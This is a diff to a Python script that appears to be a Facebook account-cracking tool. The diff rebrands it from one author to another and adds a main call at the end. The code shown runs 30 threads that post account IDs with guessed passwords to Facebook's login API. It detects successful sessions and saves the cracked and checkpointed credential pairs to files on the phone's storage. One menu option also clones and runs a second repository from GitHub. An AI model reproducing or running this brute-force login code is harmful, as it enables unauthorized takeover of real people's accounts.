@@ -78,21 +78,17 @@ tred = speed
 
 	
 logo= f'''
-
-
-██╗███╗   ███╗████████╗██╗ █████╗ ███████╗
-██║████╗ ████║╚══██╔══╝██║██╔══██╗╚══███╔╝
-██║██╔████╔██║   ██║   ██║███████║  ███╔╝ 
-██║██║╚██╔╝██║   ██║   ██║██╔══██║ ███╔╝  
-██║██║ ╚═╝ ██║   ██║   ██║██║  ██║███████╗
-╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝
-
+{G}  ██   ██ ██   ██ ██     ██
+{R}  ██   ██  ██ ██  ██     ██
+{Y}  ███████   ███   ██  █  ██
+{S}  ██   ██  ██ ██  ██ ███ ██
+{uu}  ██   ██ ██   ██  ███ ███ 
 \033[1;93m=================================
-\033[1;97m Owner  : Imtiaz Ahmed
-\033[1;97m GitHub : KING-FB
+\033[1;97m Owner  : Hannan x Wasi :/
+\033[1;97m GitHub : Hannan-404 :/
 \033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/
-\033[1;97m Status : Free
-\033[1;97m Notice : Use 10007/10006 For More Ok IDS :/
+\033[1;97m Status : Free :/
+\033[1;97m Notice : Use 10007/10006 For More OK Ids :/
 \033[1;93m=================================
 '''
 
@@ -113,8 +109,8 @@ def Hxw_Main():
         gmail()
     if inpp == "4":
      print(f'{oo("+")}Loading Best File Create Command ')
-     os.system('cd && git clone --depth=1 https://github.com/KING-FB/IMTIAZ')
-     os.system('cd && cd IMTIAZ ;python KING-FB.py')
+     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
+     os.system('cd && cd FILE ;python FILE.py')
      exit()
     if inpp == "0":
      exit('Exit!')
@@ -127,7 +123,7 @@ def file():
     os.system("clear")
     print(logo)
     if 'gm' in l:
-        file = '.IMTIAZ'
+        file = '.Hannan'
     else:
         file = input(f"{oo('-')}Enter File: ")
     try:
@@ -269,7 +265,7 @@ def method():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('•')}/sdcard/IMTIAX-OK.txt")
+    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
     print('\033[1;93m='*25)
     print()
     
@@ -346,8 +342,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mIMTIAZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/IMTIAZ-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -363,9 +359,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mIMTIAZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/IMTIAZ-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -444,8 +440,8 @@ def andom():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mIMTIAZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/IMTIAZ-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -458,9 +454,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mIMTIAZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/IMTIAZ-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -534,3 +530,8 @@ def andom():
        with speed(max_workers=30) as speede:
             speede.map(start, accounts)
     exit()
+
+
+
+
+Hxw_Main()
